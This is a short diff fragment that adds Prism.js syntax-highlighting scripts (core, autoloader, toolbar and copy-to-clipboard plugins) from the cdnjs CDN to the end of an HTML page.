+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>
+
+  </body>
+</html>
